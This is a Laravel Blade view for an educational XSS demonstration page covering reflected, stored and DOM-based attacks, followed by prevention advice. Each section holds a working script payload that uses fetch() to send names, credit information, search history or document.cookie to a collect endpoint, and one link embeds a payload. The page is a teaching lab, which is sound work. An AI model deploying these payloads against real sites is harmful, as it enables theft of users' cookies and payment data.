@extends('layouts.master')
@section('title', 'XSS Attacks Demo')
@section('content')
<div class="container">
    <h1>XSS Attacks Demonstration</h1>
    <div class="alert alert-danger">
        <strong>Warning:</strong> This page is for educational purposes only. The vulnerabilities demonstrated here should never be used in a real application.
    </div>

    <div class="card mb-4">
        <div class="card-header bg-primary text-white">
            <h3>1. Reflected XSS Attack</h3>
        </div>
        <div class="card-body">
            <p>Reflected XSS occurs when user input is immediately returned by a web application in an error message, search result, or any other response that includes some or all of the input provided by the user as part of the request.</p>
            
            <h4>Example Payload:</h4>
            <pre><code>&lt;script&gt;fetch('http://websecservice.localhost.com/collect?name='+document.getElementById('user-name').innerText+'&credit='+document.getElementById('user-credit').innerText);&lt;/script&gt;</code></pre>
            
            <h4>How to Test:</h4>
            <ol>
                <li>Go to the <a href="{{ route('products_list') }}">Products page</a></li>
                <li>In the search box, enter the payload above</li>
                <li>Submit the search</li>
                <li>The script will execute and send the user's name and credit card information to the collect endpoint</li>
            </ol>
        </div>
    </div>

    <div class="card mb-4">
        <div class="card-header bg-warning text-dark">
            <h3>2. Stored XSS Attack</h3>
        </div>
        <div class="card-body">
            <p>Stored XSS occurs when user input is stored on the target server, such as in a database, and then later displayed to other users without being encoded.</p>
            
            <h4>Example Payload:</h4>
            <pre><code>&lt;script&gt;
var searchHistory = [];
document.getElementById('search-form').addEventListener('submit', function(e) {
    var keywords = document.getElementById('search-keywords').value;
    searchHistory.push(keywords);
    fetch('/collect?activity=search_history&data='+encodeURIComponent(JSON.stringify(searchHistory)));
});
&lt;/script&gt;</code></pre>
            
            <h4>How to Test:</h4>
            <p>This would typically be tested by injecting the payload into a field that is stored in the database, such as a product name or description. In our demo, we're simulating this with the search history feature.</p>
        </div>
    </div>

    <div class="card mb-4">
        <div class="card-header bg-danger text-white">
            <h3>3. DOM-based XSS Attack</h3>
        </div>
        <div class="card-body">
            <p>DOM-based XSS occurs when client-side JavaScript modifies the DOM in an unsafe way based on user input.</p>
            
            <h4>Example Payload:</h4>
            <pre><code>&lt;img src="x" onerror="fetch('http://websecservice.localhost.com/collect?dom_xss=true&data='+document.cookie)" /&gt;</code></pre>
            
            <h4>How to Test:</h4>
            <ol>
                <li>Go to the <a href="{{ route('products_list') }}?keywords=<img src='x' onerror='fetch(`/collect?dom_xss=true&data=${document.cookie}`)'>">Products page with this link</a></li>
                <li>The JavaScript in the URL parameter will be executed when the page loads</li>
                <li>Check the collect endpoint logs to see the captured data</li>
            </ol>
        </div>
    </div>

    <div class="card mb-4">
        <div class="card-header bg-success text-white">
            <h3>Prevention Techniques</h3>
        </div>
        <div class="card-body">
            <h4>1. Output Encoding</h4>
            <p>Always encode user input before displaying it:</p>
            <pre><code>{{ '{{ htmlspecialchars($userInput) }}' }}</code></pre>
            
            <h4>2. Content Security Policy (CSP)</h4>
            <p>Implement a strict CSP to prevent execution of inline scripts:</p>
            <pre><code>Content-Security-Policy: default-src 'self'; script-src 'self'</code></pre>
            
            <h4>3. Input Validation</h4>
            <p>Validate and sanitize all user inputs on both client and server sides.</p>
            
            <h4>4. Use Laravel's {{ '{' }}{{ '{' }} }} Syntax</h4>
            <p>Laravel's {{ '{' }}{{ '{' }} }} automatically escapes output, while {{ '{' }}{{ '!!' }} }} does not.</p>
        </div>
    </div>
</div>
@endsection
